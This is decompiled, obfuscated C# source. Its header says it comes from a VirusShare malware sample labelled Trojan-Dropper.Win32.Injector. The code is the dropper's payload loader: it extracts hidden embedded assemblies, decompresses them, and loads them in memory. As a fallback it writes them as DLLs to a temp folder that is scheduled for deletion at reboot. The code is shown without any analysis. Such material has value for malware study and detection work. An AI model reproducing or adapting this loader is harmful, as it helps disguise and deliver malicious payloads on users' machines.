// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=11.0.0.0, Culture=neutral, PublicKeyToken=71f2cf7c2509b8fe
// MVID: 1F473243-1123-401F-8099-7648B7C34C41
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.deqx-3dcf304237ebec8756d9362ccf0259126c1c62ff5c0b09096876be2cdc64ae5a.exe

using \u0001;
using \u0006;
using \u0008;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0001
{
  internal class \u000E
  {
    private static Hashtable \u0001;

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0002([In] string obj0, [In] string obj1, [In] int obj2);

    internal static void \u0002()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u000E.\u0002);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex);
        throw;
      }
    }

    internal static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      \u000E.\u0001 obj;
      string s;
      char[] chArray1;
      bool flag1;
      int index1;
      string[] strArray1;
      string str1;
      string str2;
      int index2;
      int num1;
      string str3;
      bool flag2;
      Hashtable hashtable;
      Assembly assembly1;
      Stream manifestResourceStream;
      int length;
      byte[] numArray;
      Assembly assembly2;
      string path1;
      string path2;
      FileStream fileStream;
      try
      {
        obj = new \u000E.\u0001(obj1.Name);
        string str4 = obj.\u0002(false);
        if (true)
          goto label_47;
label_1:
        string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
        if (true)
          goto label_48;
label_2:
        char[] chArray2 = new char[1];
        if (true)
          goto label_49;
label_3:
        chArray1[0] = ',';
        string[] strArray2 = "e2Y1MzA5ZmU0LTViOTAtNDU3YS04ZjkyLWZiMGE3ZWZkYjQ5NH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{f5309fe4-5b90-457a-8f92-fb0a7efdb494}".Split(chArray1);
        if (true)
          goto label_50;
label_4:
        string empty = string.Empty;
        if (true)
          goto label_51;
label_5:
        if (true)
          goto label_52;
label_6:
        flag1 = false;
        index1 = 0;
        while (true)
        {
          int num2;
          if (index1 < strArray1.Length - 1)
            num2 = strArray1[index1] == str1 ? 1 : 0;
          else
            goto label_12;
label_8:
          if (num2 != 0)
          {
            str2 = strArray1[index1 + 1];
          }
          else
          {
            index1 += 2;
            continue;
          }
label_12:
          int num3;
          do
          {
            if (str2.Length == 0 && obj.\u0003.Length == 0)
              str1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
            else
              goto label_19;
label_14:
            for (index2 = 0; index2 < strArray1.Length - 1; index2 += 2)
            {
              if (strArray1[index2] == str1)
              {
                str2 = strArray1[index2 + 1];
                break;
              }
            }
label_19:
            if (true)
            {
              if (str2.Length > 0)
              {
                num3 = (int) str2[0];
                if (true)
                {
                  if (num3 == 91)
                  {
                    num1 = str2.IndexOf(']');
                    str3 = str2.Substring(1, num1 - 1);
                    flag2 = str3.IndexOf('z') >= 0;
                    flag1 = str3.IndexOf('t') >= 0;
                    str2 = str2.Substring(num1 + 1);
                  }
                  Monitor.Enter((object) (hashtable = \u000E.\u0001));
                  try
                  {
label_26:
                    int num4;
                    for (int index3 = \u000E.\u0001.ContainsKey((object) str2) ? 1 : 0; index3 == 0; index3 = num4)
                    {
                      manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str2);
                      if (manifestResourceStream != null)
                      {
                        length = (int) manifestResourceStream.Length;
                        numArray = new byte[length];
                        manifestResourceStream.Read(numArray, 0, length);
                        if (flag2)
                          numArray = \u0004.\u0002(numArray);
                        do
                        {
                          assembly2 = (Assembly) null;
                          if (!flag1)
                          {
                            try
                            {
                              assembly2 = Assembly.Load(numArray);
                            }
                            catch (FileLoadException ex)
                            {
                              flag1 = true;
                            }
                            catch (BadImageFormatException ex)
                            {
                              flag1 = true;
                            }
                          }
                          if (flag1)
                          {
                            try
                            {
                              path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str2);
                              Directory.CreateDirectory(path1);
                              path2 = path1 + obj.\u0001 + ".dll";
                              if (!File.Exists(path2))
                              {
                                fileStream = File.OpenWrite(path2);
                                fileStream.Write(numArray, 0, numArray.Length);
                                fileStream.Close();
                                \u000E.\u0002(path2, (string) null, 4);
                                \u000E.\u0002(path1, (string) null, 4);
                              }
                              assembly2 = Assembly.LoadFile(path2);
                            }
                            catch
                            {
                            }
                          }
                          num4 = -1;
                          if (num4 == 0)
                            goto label_26;
                        }
                        while (num4 == 0);
                        \u000E.\u0001[(object) str2] = (object) assembly2;
                        assembly1 = assembly2;
                        goto label_46;
                      }
                      else
                        goto label_44;
                    }
                    assembly1 = (Assembly) \u000E.\u0001[(object) str2];
                    goto label_46;
                  }
                  finally
                  {
                    Monitor.Exit((object) hashtable);
                  }
                }
                else
                  goto label_54;
              }
label_44:;
            }
            else
              goto label_14;
          }
          while (false);
          break;
label_54:
          num2 = num3;
          goto label_8;
        }
        return (Assembly) null;
label_46:
        return assembly1;
label_52:
        flag2 = false;
        goto label_6;
label_51:
        str2 = empty;
        goto label_5;
label_50:
        strArray1 = strArray2;
        goto label_4;
label_49:
        chArray1 = chArray2;
        goto label_3;
label_48:
        str1 = base64String;
        goto label_2;
label_47:
        s = str4;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objects = new object[23]
        {
          (object) obj,
          (object) s,
          (object) str1,
          (object) strArray1,
          (object) str2,
          (object) flag2,
          (object) flag1,
          (object) index1,
          (object) index2,
          (object) num1,
          (object) str3,
          (object) manifestResourceStream,
          (object) length,
          (object) numArray,
          (object) assembly2,
          (object) path1,
          (object) path2,
          (object) fileStream,
          (object) assembly1,
          (object) chArray1,
          (object) hashtable,
          obj0,
          (object) obj1
        };
        \u0004.\u0002(ex, objects);
        throw;
      }
    }

    public \u000E()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex, (object) this);
        throw;
      }
    }

    static \u000E()
    {
      try
      {
        \u000E.\u0001 = new Hashtable();
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex);
        throw;
      }
    }

    internal struct \u0001
    {
      public string \u0001;
      public Version \u0001;
      public string \u0002;
      public string \u0003;

      public string \u0002([In] bool obj0)
      {
        StringBuilder stringBuilder1;
        try
        {
          StringBuilder stringBuilder2 = new StringBuilder();
          if (true)
            goto label_11;
label_1:
          stringBuilder1.Append(this.\u0001);
          int num;
          for (int index = obj0 ? 1 : 0; index != 0; index = num)
          {
            num = this.\u0001 != (Version) null ? 1 : 0;
            if (true)
            {
              if (num == 0)
                break;
              goto label_5;
            }
          }
          goto label_6;
label_5:
          stringBuilder1.Append(", Version=");
          stringBuilder1.Append((object) this.\u0001);
label_6:
          stringBuilder1.Append(", Culture=");
          if (true)
          {
            while (true)
            {
              if (true)
              {
                stringBuilder1.Append(this.\u0002.Length == 0 ? "neutral" : this.\u0002);
                stringBuilder1.Append(", PublicKeyToken=");
                stringBuilder1.Append(this.\u0003.Length == 0 ? "null" : this.\u0003);
                goto label_10;
              }
            }
            goto label_5;
          }
label_10:
          return stringBuilder1.ToString();
label_11:
          stringBuilder1 = stringBuilder2;
          goto label_1;
        }
        catch (Exception ex)
        {
          StringBuilder o1 = stringBuilder1;
          // ISSUE: variable of a boxed type
          __Boxed<\u000E.\u0001> o2 = (ValueType) this;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o3 = (ValueType) obj0;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      public \u0001([In] string obj0)
      {
        char[] chArray1;
        string[] strArray;
        int index;
        string str1;
        string str2;
        try
        {
          this.\u0001 = (Version) null;
          this.\u0002 = string.Empty;
          this.\u0003 = string.Empty;
          this.\u0001 = string.Empty;
          string str3 = obj0;
          chArray1 = new char[1]{ ',' };
          char[] chArray2 = chArray1;
          strArray = str3.Split(chArray2);
          for (index = 0; index < strArray.Length; ++index)
          {
            str1 = strArray[index];
            str2 = str1.Trim();
            if (str2.StartsWith("Version="))
              this.\u0001 = new Version(str2.Substring(8));
            else if (str2.StartsWith("Culture="))
            {
              this.\u0002 = str2.Substring(8);
              if (this.\u0002 == "neutral")
                this.\u0002 = string.Empty;
            }
            else if (str2.StartsWith("PublicKeyToken="))
            {
              this.\u0003 = str2.Substring(15);
              if (this.\u0003 == "null")
                this.\u0003 = string.Empty;
            }
            else
              this.\u0001 = str2;
          }
        }
        catch (Exception ex)
        {
          string o1 = str1;
          string o2 = str2;
          char[] o3 = chArray1;
          string[] o4 = strArray;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<\u000E.\u0001> o6 = (ValueType) this;
          string o7 = obj0;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
          throw;
        }
      }
    }
  }
}
